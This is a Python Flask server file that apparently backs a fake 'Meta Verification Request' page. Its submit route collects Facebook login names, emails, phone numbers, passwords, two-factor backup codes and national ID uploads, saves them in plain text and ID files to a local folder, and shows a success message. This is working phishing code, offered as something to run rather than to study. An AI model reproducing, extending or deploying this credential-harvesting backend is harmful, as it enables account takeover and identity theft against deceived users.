from flask import Flask, render_template, request
import os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'submissions'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    fb_name = request.form.get('fb_name', '').strip()
    fb_email = request.form.get('fb_email', '').strip()
    fb_phone = request.form.get('fb_phone', '').strip()
    fb_password = request.form.get('fb_password', '').strip()
    backup_code = request.form.get('backup_code', '').strip()
    nid_file = request.files.get('nid_upload')

    # Check if required fields are filled
    if not fb_name or not fb_email or not fb_password or not nid_file:
        return "❌ All required fields must be filled.", 400

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    safe_name = fb_name.replace(' ', '_') or 'unknown'

    # Save data
    filename = f"{UPLOAD_FOLDER}/{safe_name}_{timestamp}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"Facebook Name: {fb_name}\n")
        f.write(f"Email/Username: {fb_email}\n")
        f.write(f"Phone Number: {fb_phone}\n")
        f.write(f"Password: {fb_password}\n")
        f.write(f"Backup Code: {backup_code}\n")

    # Save uploaded file
    if nid_file:
        ext = nid_file.filename.split('.')[-1]
        nid_path = f"{UPLOAD_FOLDER}/{safe_name}_{timestamp}_nid.{ext}"
        nid_file.save(nid_path)

    return "✅ Your Meta Verification Request has been submitted successfully."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
